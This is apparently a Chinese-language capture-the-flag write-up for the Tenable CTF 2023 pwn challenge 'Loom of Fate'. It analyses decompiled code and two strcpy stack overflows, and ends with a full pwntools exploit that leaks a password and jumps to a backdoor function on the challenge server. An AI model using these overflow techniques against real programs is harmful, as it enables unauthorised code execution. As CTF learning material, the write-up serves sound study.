channel.title: Tenable CTF 2023 on ta0lve
channel.description: Recent content in Tenable CTF 2023 on ta0lve

item.title: Tenable CTF 2023 pwn/re wp
item.description:
前言 #

本文为 Tenable CTF 2023 pwn/re 方向题目的wp及赛后复现记录，主要是简单回忆并记录一下自己当时的做题过程，仅为个人的一个学习记录，水平不高还望师傅们包容。


0x01 Skiddyana Pwnz and the Loom of Fate #

checksec #

当然，在拖入IDA前先例行检查一下：

$ checksec loom
[*] '/home/ta0lve/桌面/CTF/2023_07/loom_and_fate/loom'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

分析main函数 #

然后打开IDA开始分析

首先看到main函数，开头为两个字符串赋值：

s2 = "thisisnotthepassword";
// s2的值其实远程与本地的值是不一样的，
// 所以我们这里要想的如何泄漏出passwd的值
v8 = "Drink your ovaltine";


int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char s1[32]; // [rsp+0h] [rbp-240h] BYREF
  char v4[516]; // [rsp+20h] [rbp-220h] BYREF
  char s[8]; // [rsp+224h] [rbp-1Ch] BYREF
  int v6; // [rsp+22Ch] [rbp-14h]
  char *s2; // [rsp+230h] [rbp-10h]
  char *v8; // [rsp+238h] [rbp-8h]

  s2 = "thisisnotthepassword";                  // s2的值
  v8 = "Drink your ovaltine";
  printf("\x1B[0;33m");
  printf(
    "  ____  _    _     _     _                           ____                     \n"
    " / ___|| | _(_) __| | __| |_   _  __ _ _ __   __ _  |  _ \\__      ___ __  ____\n"
    " \\___ \\| |/ / |/ _` |/ _` | | | |/ _` | '_ \\ / _` | | |_) \\ \\ /\\ / / '_ \\|_  /\n"
    "  ___) |   <| | (_| | (_| | |_| | (_| | | | | (_| | |  __/ \\ V  V /| | | |/ / \n"
    " |____/|_|\\_\\_|\\__,_|\\__,_|\\__, |\\__,_|_| |_|\\__,_| |_|     \\_/\\_/ |_| |_/___|\n"
    "                           |___/                                              \n"
    "                                 _   _   _                                    \n"
    "                  __ _ _ __   __| | | |_| |__   ___                           \n"
    "                 / _` | '_ \\ / _` | | __| '_ \\ / _ \\                          \n"
    "                | (_| | | | | (_| | | |_| | | |  __/                          \n"
    "                 \\__,_|_| |_|\\__,_|  \\__|_| |_|\\___|                          \n"
    "                                                                              \n"
    "     _                                   __   _____     _                     \n"
    "    | |    ___   ___  _ __ ___     ___  / _| |  ___|_ _| |_ ___               \n"
    "    | |   / _ \\ / _ \\| '_ ` _ \\   / _ \\| |_  | |_ / _` | __/ _ \\              \n"
    "    | |__| (_) | (_) | | | | | | | (_) |  _| |  _| (_| | ||  __/              \n"
    "    |_____\\___/ \\___/|_| |_| |_|  \\___/|_|   |_|  \\__,_|\\__\\___|              \n"
    "     ");
  printf("\x1B[0m");
  putchar(10);
  while ( 1 )
  {
    while ( 1 )
    {
      printf("\n\n=============================================================================");
      printf(
        "\n"
        "Choose your next move:\n"
        "\n"
        "1) Enter the room of the loom\n"
        "2) Read the wall of prophecy\n"
        "3) Enter the room of the fates\n"
        "4) leave\n"
        "\n"
        "> ");
      fgets(s, 8, _bss_start);
      v6 = atoi(s);
      if ( v6 != 1 )
        break;
      v8 = loomRoom(v8, v4);
    }
    switch ( v6 )
    {
      case 2:
        puts("\n\nYou look to the grand wall in front of you.\nA prophecy is etched into the stone and looks ancient : \n");
        printf("%s", v8);
        putchar('\n');
        break;
      case 3:
        puts("\n\nBefore you is a large stone door. As you behold it, you hear a voice inside of your head.");
        printf("\n\nSpeak the unpronouncable phrase to pass to the room of fates : \n\n> ");
        fgets(s1, 26, _bss_start);
        s1[strlen(s1) - 1] = '\0';              // 题目已知：
                                                // s2 = "thisisnotthepassword";
                                                // 我们可以令
                                                // s1 = "thisisnotthepassword"+"a"+"\x00"+"\x0a"
                                                // 或者s1 = "thisisnotthepassword" + "\x0a"
        if ( !strcmp(s1, s2) )
          fatesRoom(v8);
        else
          puts("\nThe door does not open, the voice is silent.");
        break;
      case 4:
        exit(0);
      default:
        puts("\nYou get confused and try to walk in a direction that doesn't exist. It doesn't work.");
        break;
    }
  }
}

程序给了我们3个功能函数：

      printf(
        "\n"
        "Choose your next move:\n"
        "\n"
        "1) Enter the room of the loom\n"
        "2) Read the wall of prophecy\n"
        "3) Enter the room of the fates\n"
        "4) leave\n"
        "\n"
        "> ");

  • 选择1则进入loomRoom函数，

  • 选择2则会打印出loomRoom函数中的dest的值，

    • 在loomRoom函数中返回的是dest的值：

      • return dest;

    • 在main函数中将返回值赋值给v8：

      • v8 = loomRoom(v8, v4);

    • 在选择二中打印出的是以v8为地址的值

      • printf("%s", v8);

    • 所以我们要将dest的值更改为passwd的地址，就能够将passwd打印出来

    • .rodata:00000000004022E0 0A 57 68 6F 61 20 77 68 6F 61+aWhoaWhoaSlowDo db 0Ah                  ; DATA XREF: loomRoom+1E6↑o
.rodata:00000000004022E0 2C 20 73 6C 6F 77 20 64 6F 77+db 'Whoa whoa, slow down, that',27h,'s too much prophecy. Life needs some mystery.',0
.rodata:000000000040232A 74 68 69 73 69 73 6E 6F 74 74+aThisisnotthepa db 'thisisnotthepassword',0
.rodata:000000000040232A 68 65 70 61 73 73 77 6F 72 64+                                        ; DATA XREF: main+F↑o
.rodata:000000000040233F 44 72 69 6E 6B 20 79 6F 75 72+aDrinkYourOvalt db 'Drink your ovaltine',0

    • 所以dest的地址应该覆盖为 0x0040232A，即将dest覆盖为指向passwd的指针

  • 选择3则会进入检测一下passwd，如果我们已经泄漏了passwd的值，我们就可以进入fatesRoom函数

  • 注意此处并不是直接输入passwd的值即可进入fatesRoom函数

    •     case 3:
        puts("\n\nBefore you is a large stone door. As you behold it, you hear a voice inside of your head.");
        printf("\n\nSpeak the unpronouncable phrase to pass to the room of fates : \n\n> ");
        fgets(s1, 26, _bss_start);
        s1[strlen(s1) - 1] = '\0';              // 题目已知：
                                                // s2 = "thisisnotthepassword";
                                                // 我们可以令
                                                // s1 = "thisisnotthepassword"+"a"+"\x00"+"\x0a"
                                                // 或者s1 = "thisisnotthepassword" + "\x0a"
        if ( !strcmp(s1, s2) )
          fatesRoom(v8);
        else
          puts("\nThe door does not open, the voice is silent.");
        break;

    • 题目会将我们的passwd的值的倒数第二位改为'\x00'

      • 如果我们是以'\x0a'收尾的，我们的最后一位就是程序自己在字符创串最后加上的\0字符，所以我们的倒数第二位便是'\x0a'
      • 所以我们同样可以在外面自己的字符串最后构造出a\x00\x0a，这样字符串的最后便是'\x0a'前面的'\0'，程序就会将b'a'置为'\0'
      • 所以我们应该输入 passwd + b"\x0a"
      • 也可以输入passwd+b"a"+b"\x00"+b"\x0a"

    • 其实这里我们不用仔细地思考也会输入passwd然后用sendline函数在后面自动添加'\x0a'

      • 所以一般情况下不用想那么多就可以做完这道题
      • 但是如果我们一不小心在后面重复添加了两个'\x0a'就会导致我们拿不到flag
      • 所以在赛后写wp的现在，我想好好地分析一下
        • 水平不够，还望师傅们包容

分析loomRoom函数 # 

char *__fastcall loomRoom(char *a1, char *a2)
{
  char src[8]; // [rsp+10h] [rbp-120h] BYREF
  __int64 v4; // [rsp+18h] [rbp-118h]
  __int64 v5; // [rsp+20h] [rbp-110h]
  __int64 v6; // [rsp+28h] [rbp-108h]
  __int64 v7; // [rsp+30h] [rbp-100h]
  __int64 v8; // [rsp+38h] [rbp-F8h]
  __int64 v9; // [rsp+40h] [rbp-F0h]
  __int64 v10; // [rsp+48h] [rbp-E8h]
  __int64 v11; // [rsp+50h] [rbp-E0h]
  __int64 v12; // [rsp+58h] [rbp-D8h]
  __int64 v13; // [rsp+60h] [rbp-D0h]
  __int64 v14; // [rsp+68h] [rbp-C8h]
  __int64 v15; // [rsp+70h] [rbp-C0h]
  __int64 v16; // [rsp+78h] [rbp-B8h]
  __int64 v17; // [rsp+80h] [rbp-B0h]
  __int64 v18; // [rsp+88h] [rbp-A8h]
  __int64 v19; // [rsp+90h] [rbp-A0h]
  __int64 v20; // [rsp+98h] [rbp-98h]
  __int64 v21; // [rsp+A0h] [rbp-90h]
  __int64 v22; // [rsp+A8h] [rbp-88h]
  __int64 v23; // [rsp+B0h] [rbp-80h]
  __int64 v24; // [rsp+B8h] [rbp-78h]
  __int64 v25; // [rsp+C0h] [rbp-70h]
  __int64 v26; // [rsp+C8h] [rbp-68h]
  __int64 v27; // [rsp+D0h] [rbp-60h]
  __int64 v28; // [rsp+D8h] [rbp-58h]
  __int64 v29; // [rsp+E0h] [rbp-50h]
  __int64 v30; // [rsp+E8h] [rbp-48h]
  __int64 v31; // [rsp+F0h] [rbp-40h]
  __int64 v32; // [rsp+F8h] [rbp-38h]
  __int64 v33; // [rsp+100h] [rbp-30h]
  __int64 v34; // [rsp+108h] [rbp-28h]
  char s[8]; // [rsp+11Ch] [rbp-14h] BYREF
  int v36; // [rsp+124h] [rbp-Ch]
  char *dest; // [rsp+128h] [rbp-8h]

  dest = a1;
  *(_QWORD *)src = 0LL;
  v4 = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  v8 = 0LL;
  v9 = 0LL;
  v10 = 0LL;
  v11 = 0LL;
  v12 = 0LL;
  v13 = 0LL;
  v14 = 0LL;
  v15 = 0LL;
  v16 = 0LL;
  v17 = 0LL;
  v18 = 0LL;
  v19 = 0LL;
  v20 = 0LL;
  v21 = 0LL;
  v22 = 0LL;
  v23 = 0LL;
  v24 = 0LL;
  v25 = 0LL;
  v26 = 0LL;
  v27 = 0LL;
  v28 = 0LL;
  v29 = 0LL;
  v30 = 0LL;
  v31 = 0LL;
  v32 = 0LL;
  v33 = 0LL;
  v34 = 0LL;
  puts("\n\n=============================================================================\n");
  printf(
    "You enter the room of the loom, and see the loom of fate before you. You can etch a prophecy into the futre, or leav"
    "e the future alone.\n"
    "1) Prophesize\n"
    "2) Leave\n"
    "\n"
    "> ");
  fgets(s, 8, _bss_start);
  v36 = atoi(s);
  if ( v36 == 1 )
  {
    fgets(src, 0x11E, _bss_start);
    if ( strlen(src) <= 0x100 )
    {
      dest = a2;
      strcpy(a2, src);
    }
    else
    {
      puts("\nWhoa whoa, slow down, that's too much prophecy. Life needs some mystery.");
    }
  }
  return dest;
}

  • 可以看到 loomRoom函数调用了一个危险函数strcpy，存在明显的溢出漏洞，

  • 我们写入的src在dest的上方且距离 0x118，

    • -0000000000000130 var_130 dq ?
-0000000000000128 var_128 dq ?
-0000000000000120 src db 8 dup(?) # 我们写入的src
-0000000000000118 var_118 dq ?
-0000000000000110 var_110 dq ?
......
-0000000000000014 s db 8 dup(?)
-000000000000000C var_C dd ?
-0000000000000008 dest dq ?     # 返回值dest                ; offset
+0000000000000000  s db 8 dup(?)
+0000000000000008  r db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables

    • 距离为0x120 - 0x8 = 0x108

  • 我们可以直接溢出覆盖 dest 的值，将 dest 覆盖为指向 passwd 的指针，

  • 这样我们就可以在使用功能2打印 dest 的值时将 passwd 打印出来


分析fatesRoom # 

int __fastcall fatesRoom(const char *a1)
{
  char dest[8]; // [rsp+10h] [rbp-90h] BYREF
  __int64 v3; // [rsp+18h] [rbp-88h]
  __int64 v4; // [rsp+20h] [rbp-80h]
  __int64 v5; // [rsp+28h] [rbp-78h]
  __int64 v6; // [rsp+30h] [rbp-70h]
  __int64 v7; // [rsp+38h] [rbp-68h]
  __int64 v8; // [rsp+40h] [rbp-60h]
  __int64 v9; // [rsp+48h] [rbp-58h]
  __int64 v10; // [rsp+50h] [rbp-50h]
  __int64 v11; // [rsp+58h] [rbp-48h]
  __int64 v12; // [rsp+60h] [rbp-40h]
  __int64 v13; // [rsp+68h] [rbp-38h]
  __int64 v14; // [rsp+70h] [rbp-30h]
  __int64 v15; // [rsp+78h] [rbp-28h]
  __int64 v16; // [rsp+80h] [rbp-20h]
  __int64 v17; // [rsp+88h] [rbp-18h]
  char s[8]; // [rsp+94h] [rbp-Ch] BYREF
  int v19; // [rsp+9Ch] [rbp-4h]

  *(_QWORD *)dest = 0LL;
  v3 = 0LL;
  v4 = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  v8 = 0LL;
  v9 = 0LL;
  v10 = 0LL;
  v11 = 0LL;
  v12 = 0LL;
  v13 = 0LL;
  v14 = 0LL;
  v15 = 0LL;
  v16 = 0LL;
  v17 = 0LL;
  puts("\n\n=============================================================================\n");
  printf("You enter the room of fates and see the tapestry of reality laid out before you.");
  puts("\nThe voice in your head returns:");
  puts("\n'Are you willing to force your prophecy onto the past? To corrupt this reality to find what you seek?'");
  printf("\n1) Yes\n2) No\n\n> ");
  fflush(_bss_start);
  fgets(s, 8, _bss_start);
  v19 = atoi(s);
  if ( v19 == 1 )
    return (unsigned int)strcpy(dest, a1);
  else
    return puts("\nYou leave the room of the fates, this reality intact.");
}

  • 可以看到这里有一个危险函数strcpy

    • 可以栈溢出覆盖返回地址为后门函数丶地址

    • 0000000000000090 dest db 8 dup(?)
-0000000000000088 var_88 dq ?
-0000000000000080 var_80 dq ?
-0000000000000078 var_78 dq ?
-0000000000000070 var_70 dq ?
-0000000000000068 var_68 dq ?
-0000000000000060 var_60 dq ?
-0000000000000058 var_58 dq ?
-0000000000000050 var_50 dq ?
-0000000000000048 var_48 dq ?
-0000000000000040 var_40 dq ?
-0000000000000038 var_38 dq ?
-0000000000000030 var_30 dq ?
-0000000000000028 var_28 dq ?
-0000000000000020 var_20 dq ?
-0000000000000018 var_18 dq ?
-0000000000000010 db ? ; undefined
-000000000000000F db ? ; undefined
-000000000000000E db ? ; undefined
-000000000000000D db ? ; undefined
-000000000000000C s db 8 dup(?)
-0000000000000004 var_4 dd ?
+0000000000000000  s db 8 dup(?)
+0000000000000008  r db 8 dup(?)

    • 可以看到偏移offset = 0x90+0x8 = 0x98

  • a1即函数调用时的参数v8，即我们loomRoom函数中的dest的值

    • 所以我们要再调用一次loomRoom函数，
    • 将dest的值改为0x98大小的padding加上后门函数的地址

exp # 

from pwn import *

is_debug = 0
is_remote = 1

if is_debug:
    context.log_level = 'debug'

if is_remote == 1:
    taolve = remote("0.cloud.chals.io", 33616)
else:
    taolve = process('./loom')


def _gdb(my_gdb):
    if my_gdb == 1:
        os.system("echo \"source ~/pwndbg/gdbinit.py\" > ~/.gdbinit")
        gdb.attach(taolve)
    elif my_gdb == 2:
        os.system("echo \"source ~/gef/gef.py\" > ~/.gdbinit")
        gdb.attach(taolve)
    elif my_gdb == 3:
        os.system("echo \"source ~/peda/peda.py\" > ~/.gdbinit")
        gdb.attach(taolve)

        
"""
need to leak password first

overwrite dest in loomroom(), print password with option 2
"""

### 通过loomRoom函数将dest覆盖为指向passwd的指针
# 进入loomRoom函数
taolve.recvuntil(b"> ")
taolve.sendline(b"1")
taolve.recvuntil(b"> ")
taolve.sendline(b"1")
# 我们写入的src在dest的上方且距离0x118
passwd_addr = 0x040232A
pay1 = b"a"*0x118 + p64(passwd_addr) # b"\x2A\x23\x40\x00\x00"
taolve.sendline(pay1)

### 获取passwd的值
taolve.recvuntil(b"> ")
taolve.sendline(b"2")
taolve.recvuntil(b"A prophecy is etched into the stone and looks ancient : \n\n")
passwd = taolve.recvuntil(b"=")[0:-4]
log.success("passwd == " + str(passwd))

### 填写s1,之后利用strcpy函数的漏洞将ret地址改为backdoor地址
backdoor = 0x4012b6
pay2 = b"a"*0x90 + b"b"*8 + p64(backdoor)
taolve.recvuntil(b"> ")
taolve.sendline(b"1")
taolve.recvuntil(b"> ")
taolve.sendline(b"1")
taolve.sendline(pay2)

### 利用我们获得的passwd调用strcopy危险函数
pay3 = passwd + b"\x0a"
# pay3 = passwd + b"a\x00\x0a"
taolve.recvuntil(b"> ")
taolve.sendline(b"3")
taolve.recvuntil(b"> ")
taolve.send(pay3)

taolve.recvuntil(b"No")
taolve.sendline(b"1")

taolve.interactive()

"""
后门函数自动获取flag:
You stretch the fabric of this reality, its premise worn thin.

...th...this is what you destroyed reality for?
Ok. Well. It's yours.

flag{d0nt_f0rg3t_y0ur_h4t}
"""


此文章还在施工中，

路过的师傅们看看远处的学习记录吧！
